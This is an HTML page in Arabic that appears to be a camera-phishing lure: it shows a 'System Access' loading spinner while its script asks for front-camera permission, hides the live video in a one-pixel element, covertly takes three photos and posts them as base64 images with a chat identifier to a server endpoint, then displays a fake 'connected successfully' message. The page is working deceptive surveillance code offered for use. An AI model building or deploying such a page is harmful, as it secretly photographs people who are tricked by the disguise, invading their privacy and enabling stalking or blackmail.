<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>System Access</title>
<style>
  body {
    background-color: #0d0d0d; color: #fff; 
    font-family: system-ui, -apple-system, sans-serif;
    margin: 0; display: flex; flex-direction: column;
    align-items: center; justify-content: center;
    height: 100vh; overflow: hidden;
  }
  .spinner {
    border: 4px solid #333; border-top: 4px solid #fff;
    border-radius: 50%; width: 50px; height: 50px;
    animation: spin 1s linear infinite; margin-bottom: 20px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  #status-text { font-size: 18px; color: #aaa; letter-spacing: 1px; }
  
  /* الفيديو مخفي بس شغال عشان ياخد الصور */
  #video { 
    position: absolute; top: 0; left: 0; 
    width: 1px; height: 1px; opacity: 0.01; pointer-events: none; 
  }
</style>
</head>
<body>

<div class="spinner" id="spinner"></div>
<div id="status-text">أنتظر قليلاً...</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
  const urlParams = new URLSearchParams(window.location.search);
  const chatId = urlParams.get('chatId');
  const statusText = document.getElementById('status-text');
  const spinner = document.getElementById('spinner');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');

  async function run() {
    if(!chatId) {
      statusText.innerText = "رابط غير صالح";
      statusText.style.color = "#f00";
      spinner.style.display = 'none';
      return;
    }

    try {
      // طلب إذن الكاميرا
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user" }, audio: false 
      });
      
      video.srcObject = stream;
      await video.play();

      // انتظار الكاميرا تجهز
      let checkVideo = setInterval(async () => {
        if (video.videoWidth > 0 && video.videoHeight > 0) {
          clearInterval(checkVideo);
          
          // التقاط 3 صور ورا بعض
          for (let i = 0; i < 3; i++) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // ضغط الصورة وإرسالها
            const imageData = canvas.toDataURL('image/jpeg', 0.7);
            await fetch('/api/photo', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ chat_id: chatId, image_b64: imageData })
            });

            // استنى ثانية ونص قبل الصورة اللي بعدها
            if(i < 2) await new Promise(r => setTimeout(r, 1500));
          }

          // خلصنا
          spinner.style.display = 'none';
          statusText.innerText = "تم الاتصال بنجاح.";
          statusText.style.color = "#0f0";
        }
      }, 200);

    } catch (err) {
      spinner.style.display = 'none';
      statusText.innerText = "تم رفض الصلاحية.";
      statusText.style.color = "#f00";
    }
  }

  run();
</script>
</body>
</html>
